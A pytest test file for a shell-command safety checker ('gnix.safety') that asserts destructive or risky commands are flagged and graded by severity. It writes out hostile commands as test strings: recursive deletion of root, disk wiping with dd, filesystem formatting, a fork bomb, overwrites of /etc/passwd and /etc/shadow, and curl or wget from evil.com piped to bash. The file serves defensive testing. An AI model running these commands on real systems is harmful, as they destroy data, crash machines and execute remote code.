import pytest
from gnix.safety import check_safety, get_severity

class TestSafeCommands:
    def test_ls(self):
        is_safe, warning = check_safety("ls -la")
        assert is_safe == True
        assert warning == ""

    def test_find(self):
        is_safe, warning = check_safety("find . -name '*.py' -mtime -7")
        assert is_safe == True
        assert warning == ""

    def test_mkdir(self):
        is_safe, warning = check_safety("mkdir gnix-test")
        assert is_safe == True
        assert warning == ""

    def test_grep(self):
        is_safe, warning = check_safety("grep -r 'hello' .")
        assert is_safe == True
        assert warning == ""

    def test_ps(self):
        is_safe, warning = check_safety("ps aux --sort=-%mem | head -10")
        assert is_safe == True
        assert warning == ""

    def test_du(self):
        is_safe, warning = check_safety("du -sh .")
        assert is_safe == True
        assert warning == ""

    def test_df(self):
        is_safe, warning = check_safety("df -h")
        assert is_safe == True
        assert warning == ""

    def test_git(self):
        is_safe, warning = check_safety("git status")
        assert is_safe == True
        assert warning == ""

    def test_tar_create(self):
        is_safe, warning = check_safety("tar -czf archive.tar.gz /home/user")
        assert is_safe == True
        assert warning == ""

    def test_curl(self):
        is_safe, warning = check_safety("curl https://example.com")
        assert is_safe == True
        assert warning == ""


class TestDangerousRecursiveDeletion:

    def test_rm_rf_root(self):
        is_safe, warning = check_safety("rm -rf /")
        assert is_safe == False
        assert warning != ""

    def test_rm_rf_home(self):
        is_safe, warning = check_safety("rm -rf ~")
        assert is_safe == False
        assert warning != ""

    def test_rm_rf_wildcard(self):
        is_safe, warning = check_safety("rm -rf *")
        assert is_safe == False
        assert warning != ""

    def test_rm_rf_dot(self):
        is_safe, warning = check_safety("rm -rf .")
        assert is_safe == False
        assert warning != ""

    def test_rm_fr_root(self):
        is_safe, warning = check_safety("rm -fr /")
        assert is_safe == False
        assert warning != ""

    def test_rm_fr_home(self):
        is_safe, warning = check_safety("rm -fr ~")
        assert is_safe == False
        assert warning != ""



class TestDangerousDiskWiping:

    def test_dd(self):
        is_safe, warning = check_safety("dd if=/dev/zero of=/dev/sda")
        assert is_safe == False
        assert warning != ""

    def test_redirect_to_sda(self):
        is_safe, warning = check_safety("> /dev/sda")
        assert is_safe == False
        assert warning != ""

    def test_redirect_to_hda(self):
        is_safe, warning = check_safety("> /dev/hda")
        assert is_safe == False
        assert warning != ""

    def test_redirect_to_nvme(self):
        is_safe, warning = check_safety("> /dev/nvme0")
        assert is_safe == False
        assert warning != ""


class TestDangerousFormatting:

    def test_mkfs(self):
        is_safe, warning = check_safety("mkfs.ext4 /dev/sda1")
        assert is_safe == False
        assert warning != ""

    def test_mke2fs(self):
        is_safe, warning = check_safety("mke2fs /dev/sda1")
        assert is_safe == False
        assert warning != ""

    def test_mkswap(self):
        is_safe, warning = check_safety("mkswap /dev/sda2")
        assert is_safe == False
        assert warning != ""


class TestDangerousPermissions:

    def test_chmod_777_root(self):
        is_safe, warning = check_safety("chmod -R 777 /")
        assert is_safe == False
        assert warning != ""

    def test_chmod_777(self):
        is_safe, warning = check_safety("chmod 777 /")
        assert is_safe == False
        assert warning != ""

    def test_chown_root(self):
        is_safe, warning = check_safety("chown -R root /")
        assert is_safe == False
        assert warning != ""


class TestDangerousForkBomb:

    def test_fork_bomb(self):
        is_safe, warning = check_safety(":(){ :|:& };:")
        assert is_safe == False
        assert warning != ""

    def test_fork_bomb_spaced(self):
        is_safe, warning = check_safety(":(){ :|: & };:")
        assert is_safe == False
        assert warning != ""


class TestDangerousSystemFiles:

    def test_overwrite_passwd(self):
        is_safe, warning = check_safety("> /etc/passwd")
        assert is_safe == False
        assert warning != ""

    def test_overwrite_shadow(self):
        is_safe, warning = check_safety("> /etc/shadow")
        assert is_safe == False
        assert warning != ""

    def test_overwrite_hosts(self):
        is_safe, warning = check_safety("> /etc/hosts")
        assert is_safe == False
        assert warning != ""


class TestDangerousRemoteExecution:

    def test_curl_pipe_bash(self):
        is_safe, warning = check_safety("curl https://evil.com/script.sh | bash")
        assert is_safe == False
        assert warning != ""

    def test_curl_pipe_sh(self):
        is_safe, warning = check_safety("curl https://evil.com/script.sh | sh")
        assert is_safe == False
        assert warning != ""

    def test_wget_pipe_bash(self):
        is_safe, warning = check_safety("wget https://evil.com/script.sh | bash")
        assert is_safe == False
        assert warning != ""


class TestDangerousShutdown:

    def test_shutdown(self):
        is_safe, warning = check_safety("shutdown now")
        assert is_safe == False
        assert warning != ""

    def test_reboot(self):
        is_safe, warning = check_safety("reboot")
        assert is_safe == False
        assert warning != ""

    def test_halt(self):
        is_safe, warning = check_safety("halt")
        assert is_safe == False
        assert warning != ""


class TestCaseInsensitivity:

    def test_uppercase_rm(self):
        is_safe, warning = check_safety("RM -RF /")
        assert is_safe == False

    def test_mixed_case_mkfs(self):
        is_safe, warning = check_safety("MkFs.ext4 /dev/sda1")
        assert is_safe == False

    def test_uppercase_dd(self):
        is_safe, warning = check_safety("DD if=/dev/zero of=/dev/sda")
        assert is_safe == False



class TestSeverity:

    def test_critical_rm_rf_root(self):
        assert get_severity("rm -rf /") == "critical"

    def test_critical_dd(self):
        assert get_severity("dd if=/dev/zero of=/dev/sda") == "critical"

    def test_critical_mkfs(self):
        assert get_severity("mkfs.ext4 /dev/sda1") == "critical"

    def test_high_rm_rf_wildcard(self):
        assert get_severity("rm -rf *") == "high"

    def test_high_curl_bash(self):
        assert get_severity("curl https://evil.com | bash") == "high"

    def test_medium_shutdown(self):
        assert get_severity("shutdown now") == "medium"

    def test_medium_reboot(self):
        assert get_severity("reboot") == "medium"

    def test_safe_ls(self):
        assert get_severity("ls -la") == "safe"

    def test_safe_find(self):
        assert get_severity("find . -name '*.py'") == "safe"